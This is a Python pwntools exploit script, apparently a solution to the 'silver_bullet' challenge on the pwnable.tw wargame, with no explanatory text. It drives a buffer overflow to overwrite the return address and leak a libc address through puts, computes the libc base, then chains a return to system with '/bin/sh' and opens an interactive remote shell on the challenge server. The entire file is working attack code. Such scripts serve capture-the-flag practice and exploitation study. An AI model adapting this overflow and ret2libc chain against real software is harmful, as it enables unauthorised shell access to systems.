from pwn import *
def cmd(c):
	p.sendlineafter("choice :",str(c))
def bt(name):
	cmd(1)
	p.sendafter("bullet :",name)
def pt(name):
	cmd(2)
	p.sendafter("bullet :",name)
#p=process("./silver_bullet",env={'LD_PRELOAD':"./libc_32.so.6"})
p=remote("chall.pwnable.tw",10103)
bt("A"*0x28)
pt("A"*8)
put=0x80484A8
main=0x8048954
got=0x804afdc
context.log_level='debug'
pt("\xff\xff\xff"+p32(0xdeadbeef)+p32(put)+p32(main)+p32(0x804afdc))
cmd(3)
p.readuntil("!!\n")
base=u32(p.read(4))-(0xf75e6140-0xf7587000)
log.warning(hex(base))
#gdb.attach(p)
libc=ELF("./libc_32.so.6")
bt("A"*0x28)
pt("A"*8)
libc.address=base
pt("\xff\xff\xff"+p32(0xdeadbeef)+p32(0xf7578940-0xf753e000+base)+p32(0xdeadbeef)+p32(libc.search("/bin/sh").next()))
cmd(3)
p.sendline("cd /home/silver_bullet")
p.interactive()
